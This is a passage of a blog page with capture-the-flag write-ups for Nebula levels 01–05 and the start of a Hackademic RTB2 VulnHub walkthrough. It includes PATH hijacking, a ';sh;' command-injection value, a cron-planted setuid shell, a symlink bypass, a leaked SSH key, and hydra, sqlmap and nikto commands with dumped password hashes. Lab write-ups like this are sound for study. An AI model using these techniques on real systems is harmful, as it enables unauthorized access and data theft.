</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">echo</span> <span class="s1">&#39;sh&#39;</span> &gt; <span class="nb">echo</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span><span class="nb"> </span>chmod +x ./echo
</span><span class='line'><span class="gp">level01@nebula:~$</span> id
</span><span class='line'><span class="go">uid=1002(level01) gid=1002(level01) groups=1002(level01)</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span> /home/flag01/flag01
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)</span>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level02</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level02@nebula:~$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;;sh;&#39;</span>
</span><span class='line'><span class="gp">level02@nebula:~$</span> /home/flag02/flag02
</span><span class='line'><span class="go">about to call system(&quot;/bin/echo ;sh; is cool&quot;)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level03</h2>

<p>There is a crontab entry that is called every couple of minutes.</p>

<p>Because the /tmp is mounted with nosuid option, we use home directory to store suid binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level03@nebula:~$</span> mount <span class="p">|</span> grep nosuid
</span><span class='line'><span class="go">proc on /proc type proc (rw,noexec,nosuid,nodev)</span>
</span><span class='line'><span class="go">sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)</span>
</span><span class='line'><span class="go">devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)</span>
</span><span class='line'><span class="go">tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)</span>
</span><span class='line'><span class="go">tmpfs on /tmp type tmpfs (rw,nosuid,nodev)</span>
</span><span class='line'><span class="go">none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)</span>
</span><span class='line'><span class="go">none on /run/shm type tmpfs (rw,nosuid,nodev)</span>
</span><span class='line'><span class="go">vmware-vmblock on /run/vmblock-fuse type fuse.vmware-vmblock (rw,nosuid,nodev,default_permissions,allow_other)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The file invoked by cron is here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cat writable.sh
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
</span><span class='line'>  <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
</span><span class='line'>  rm -f <span class="s2">&quot;$i&quot;</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Our code to obtain suid shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:~<span class="nv">$ </span><span class="nb">cd</span> /home/flag03/writable.d/
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="s1">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="s1">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="s1">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">int main()</span>
</span><span class='line'><span class="s1">{</span>
</span><span class='line'><span class="s1">   setreuid(geteuid(),geteuid());</span>
</span><span class='line'><span class="s1">   execve(&quot;/bin/sh&quot;, NULL, NULL);</span>
</span><span class='line'>
</span><span class='line'><span class="s1">   return 0;</span>
</span><span class='line'><span class="s1">}</span>
</span><span class='line'><span class="s1">&#39;</span> &gt; /tmp/run.c
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash</span>
</span><span class='line'><span class="s1">gcc /tmp/run.c -o /home/flag03/x</span>
</span><span class='line'><span class="s1">chmod +s /home/flag03/x</span>
</span><span class='line'><span class="s1">&#39;</span> &gt; run.sh
</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>chmod +x run.sh
</span></code></pre></td></tr></table></div></figure>


<p>After a little waiting, the suid binary is created:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>../x
</span><span class='line'>bash-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>Level04</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We cannot read the token file, but symlink technique is sufficient:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:~$ cd /home/flag04/
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 
</span><span class='line'>./flag04 [file to read]
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 token 
</span><span class='line'>You may not access 'token'
</span><span class='line'>level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/x
</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/x 
</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2
</span><span class='line'>level04@nebula:/home/flag04$ su - flag04
</span><span class='line'>Password: 
</span><span class='line'>flag04@nebula:~$ getflag 
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level05</h2>

<p>In /home/flag05 we can find the backup file with ssh private key.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> tar xvzf .backup/backup-19072011.tgz  -C /tmp/
</span><span class='line'><span class="go">.ssh/</span>
</span><span class='line'><span class="go">.ssh/id_rsa.pub</span>
</span><span class='line'><span class="go">.ssh/id_rsa</span>
</span><span class='line'><span class="go">.ssh/authorized_keys</span>
</span><span class='line'>
</span><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> ssh -i /tmp/.ssh/id_rsa flag05@0
</span><span class='line'><span class="gp">flag05@nebula:~$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>



</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/03/hackademic-rtb2/">Hackademic: RTB2</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-03T17:26:01+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>5:26 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb2,18/">Hackademic: RTB2</a></p>

<p>We gained the IP address 192.168.80.150 for our testing target.</p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:# nmap 192.168.80.150 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:55 CEST
</span><span class='line'>Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
</span><span class='line'>SYN Stealth Scan Timing: About 65.57% done; ETC: 07:55 (0:00:01 remaining)
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00039s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE    SERVICE
</span><span class='line'>80/tcp  open     http
</span><span class='line'>666/tcp filtered doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds</span></code></pre></td></tr></table></div></figure>


<p>It seems that the port 666 is filtered by the firewall. After running nmap scan
several times, we found the port to be open.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:# nmap 192.168.80.150 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:55 CEST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00036s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE    SERVICE
</span><span class='line'>80/tcp  open     http
</span><span class='line'>666/tcp filtered doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds
</span><span class='line'>
</span><span class='line'>root@kali32:~# nmap 192.168.80.150 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:56 CEST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up (0.00038s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>80/tcp  open  http
</span><span class='line'>666/tcp open  doom
</span><span class='line'>MAC Address: 00:0C:29:74:B5:21 (VMware)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds</span></code></pre></td></tr></table></div></figure>


<p>Nikto output for port 80:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h http://192.168.80.150/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.80.150
</span><span class='line'>+ Target Hostname:    192.168.80.150
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-04-30 10:15:26 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.14 (Ubuntu)
</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ Uncommon header 'tcn' found, with contents: list
</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
</span><span class='line'>+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, inode: 413560, size: 5108, mtime: Tue Aug 28 12:48:10 2007
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ 7495 requests: 0 error(s) and 15 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-04-30 10:15:41 (GMT2) (15 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>The web page suggests to look for SQLi, unfortunately we were not able to find
any here.</p>

<p>Trying hydra for bruteforce or joomscan (port 666) reveals us nothing new too.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# hydra 192.168.80.150 http-form-post "/check.php:username=^USER^&password=^PASS^&Submit=Check%21:wrong credentials" -L /usr/share/ncrack/default.usr -P /usr/share/ncrack/default.pwd  -t 10 -w 30  -u -f 
</span><span class='line'>root@kali32:/tmp# joomscan -u http://192.168.80.150:666/index.php -oh</span></code></pre></td></tr></table></div></figure>


<p>After a little time, we found SQLi in Joomla and dumped the whole database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --dump-all</span></code></pre></td></tr></table></div></figure>


<p>Trying to crack MySQL hashes was without success.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv 
</span><span class='line'>Host,User,Password,ssl_type,Drop_priv,File_priv,Grant_priv,Super_priv,Alter_priv,ssl_cipher,Index_priv,Event_priv,Create_priv,max_updates,Reload_priv,Delete_priv,Insert_priv,x509_issuer,Select_priv,Update_priv,Execute_priv,Show_db_priv,x509_subject,Process_priv,Trigger_priv,Shutdown_priv,max_questions,Show_view_priv,References_priv,max_connections,Repl_slave_priv,Repl_client_priv,Create_user_priv,Create_view_priv,Lock_tables_priv,Alter_routine_priv,Create_routine_priv,max_user_connections,Create_tmp_table_priv
</span><span class='line'>localhost,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>HackademicRTB2,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>127.0.0.1,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
